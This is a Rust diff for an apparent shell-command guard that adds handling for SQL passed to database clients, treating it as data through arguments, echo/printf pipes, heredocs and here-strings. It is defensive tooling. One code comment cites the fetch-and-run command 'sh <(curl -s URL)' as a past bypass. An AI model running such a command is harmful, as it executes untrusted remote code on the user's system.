@@ -12,6 +12,7 @@ mod git_editor;
 mod inline_calls;
 pub(crate) mod output_options;
 pub(crate) mod runners;
+mod sql_text;
 mod unread_parts;
 
 pub(crate) use inline_calls::InlineReading;
@@ -12805,6 +12806,11 @@ fn unlisted_runner_code(name: &str, args: &[String]) -> Option<String> {
             },
             _ => continue,
         };
+        // SQL a client runs in the database is data; a client command
+        // that reaches the shell makes it not data ([`sql_text`]).
+        if takes_code && sql_text::is_sql_client(name) && sql_text::sql_text_is_data(&value) {
+            continue;
+        }
         if takes_code {
             lines.extend(code_value_lines(&value));
         } else {
@@ -13523,7 +13529,10 @@ fn mask_literal_command_args(
                     !pipeline_is_data_only(pipeline, source)
                 }
             });
-    if in_non_data_pipeline
+    // `echo 'INSERT ...' | psql`: the text goes into a SQL client only.
+    let feeds_sql_data =
+        matches!(name.as_str(), "echo" | "printf") && echo_feeds_sql_data(command, &name, source);
+    if (in_non_data_pipeline && !feeds_sql_data)
         || has_execution_sink_ancestor(command, source)
         || writes_security_or_execution_sink(command, source)
         || writes_payload_executed_later(command, source)
@@ -13637,8 +13646,81 @@ fn mask_literal_command_args(
                 mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
+        // The SQL a client is handed on the line, where it is only data
+        // ([`sql_text::sql_text_is_data`]).
+        client if sql_text::is_sql_client(client) => {
+            let words: Vec<String> = arguments
+                .iter()
+                .map(|argument| shell_word(&node_text(*argument, source)))
+                .collect();
+            for (index, sql) in sql_text::sql_arguments(client, &words) {
+                if let Some(argument) = arguments
+                    .get(index)
+                    .filter(|_| sql_text::sql_text_is_data(&sql))
+                {
+                    mask_preserving_substitutions(
+                        *argument,
+                        source,
+                        masked,
+                        executable_inside_mask,
+                    );
+                }
+            }
+        }
         _ => {}
     }
+}
+
+/// Whether `command`, an `echo` or `printf`, is the first of a pipeline
+/// of two whose second is a SQL client, and all it prints is SQL that is
+/// only data ([`sql_text::sql_text_is_data`]): `echo "INSERT ..." | psql`.
+/// An `echo` with options, or a `printf` format with escapes other than a
+/// line end or a tab, is not read.
+fn echo_feeds_sql_data(command: tree_sitter::Node<'_>, name: &str, source: &[u8]) -> bool {
+    let Some(pipeline) = command.parent().and_then(nearest_pipeline) else {
+        return false;
+    };
+    if inside_a_substitution(pipeline) {
+        return false;
+    }
+    let mut commands = Vec::new();
+    collect_commands(pipeline, &mut commands, 0);
+    let [first, second] = commands.as_slice() else {
+        return false;
+    };
+    if first.id() != command.id() || sql_client_words(*second, source).is_none() {
+        return false;
+    }
+    let mut texts: Vec<String> = command_arguments(command)
+        .iter()
+        .map(|argument| shell_word(&node_text(*argument, source)))
+        .collect();
+    if texts.is_empty() || texts.iter().any(|text| text.starts_with('-')) {
+        return false;
+    }
+    if name == "printf" {
+        match sql_text::printf_format_text(&texts[0]) {
+            Some(format) => texts[0] = format,
+            None => return false,
+        }
+    }
+    texts.iter().all(|text| sql_text::sql_text_is_data(text))
+}
+
+/// The SQL client a command runs, behind the wrappers the guard unwraps,
+/// with the words after its name,
+/// shell quotes taken off.
+fn sql_client_words(
+    command: tree_sitter::Node<'_>,
+    source: &[u8],
+) -> Option<(String, Vec<String>)> {
+    let words = command_words(command, source)?;
+    let effective = effective_command_words(&words, 0)?;
+    let name = normalized_command_name(effective.first()?);
+    sql_text::is_sql_client(&name).then(|| {
+        let args = effective[1..].iter().map(|word| shell_word(word)).collect();
+        (name, args)
+    })
 }
 
 #[derive(Clone, Copy)]
@@ -14345,7 +14427,13 @@ fn mask_data_heredoc(
     let redefined = owner
         .as_deref()
         .is_some_and(|name| line_redefines(root_node(body), name, source));
+    // A SQL client reads its input as SQL: data where the SQL is only data.
+    let sql_data = owner_command.is_some_and(|command| {
+        sql_client_words(command, source).is_some()
+            && sql_text::sql_text_is_data(&node_text(body, source))
+    });
     if (matches!(owner.as_deref(), Some("cat" | "tee"))
+        || sql_data
         || owner_command.is_some_and(|command| reads_stdin_as_message(command, redirected, source)))
         && !redefined
         && data_only_pipeline
@@ -14453,7 +14541,15 @@ fn mask_message_herestring(
     // The grammar hangs a here-string on its command, or on the statement
     // around it.
     let redirected = ancestor_of_kind(redirect, "redirected_statement").unwrap_or(owner);
-    if !reads_stdin_as_message(owner, redirected, source)
+    let Some(value) = redirect.named_child((redirect.named_child_count() as u32).saturating_sub(1))
+    else {
+        return;
+    };
+    // A SQL client reads the here-string as SQL: data where the SQL is
+    // only data.
+    let sql_data = sql_client_words(owner, source).is_some()
+        && sql_text::sql_text_is_data(&shell_word(&node_text(value, source)));
+    if !(sql_data || reads_stdin_as_message(owner, redirected, source))
         || output_piped_past_data(owner, redirected, source)
         || has_execution_sink_ancestor(owner, source)
         || command_name(owner, source).is_some_and(|name| {
@@ -14462,10 +14558,6 @@ fn mask_message_herestring(
     {
         return;
     }
-    let Some(value) = redirect.named_child((redirect.named_child_count() as u32).saturating_sub(1))
-    else {
-        return;
-    };
     // The word stays a word: masked whole, `<<<` is left without one, the
     // projection no longer parses and the rest of the line goes unread
     // (`git commit -F - <<< 'x'; sh <(curl -s URL)` fell from deny to
